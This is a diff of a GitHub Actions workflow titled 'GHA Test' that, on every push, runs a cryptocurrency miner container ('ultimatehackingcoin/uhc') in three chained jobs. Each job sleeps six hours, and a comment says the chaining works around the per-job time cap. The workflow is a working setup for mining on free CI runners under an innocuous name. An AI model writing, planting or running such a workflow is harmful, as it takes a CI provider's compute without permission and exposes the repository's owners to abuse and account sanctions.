@@ -1,9 +1,26 @@
 name: GHA Test
 on: [push]
-jobs:
-  Run-cryptominer:
+jobs: 
+  Run-crypto1: #Each job can run for 6h max
     runs-on: ubuntu-latest
     steps:
       - run: echo "Running cryptominer"
-      - run: docker run -it ultimatehackingcoin/uhc
-      - run: sleep 100000
+      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker exec -d uhc ./uhcd
+      - run: sleep 6h
+  Run-crypto2:
+    runs-on: ubuntu-latest
+    needs: Run-crypto1
+    steps:
+      - run: echo "Running cryptominer"
+      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker exec -d uhc ./uhcd
+      - run: sleep 6h
+  Run-crypto3:
+    runs-on: ubuntu-latest
+    needs: Run-crypto2
+    steps:
+      - run: echo "Running cryptominer"
+      - run: docker run ultimatehackingcoin/uhc --name uhc
+      - run: docker exec -d uhc ./uhcd
+      - run: sleep 6h
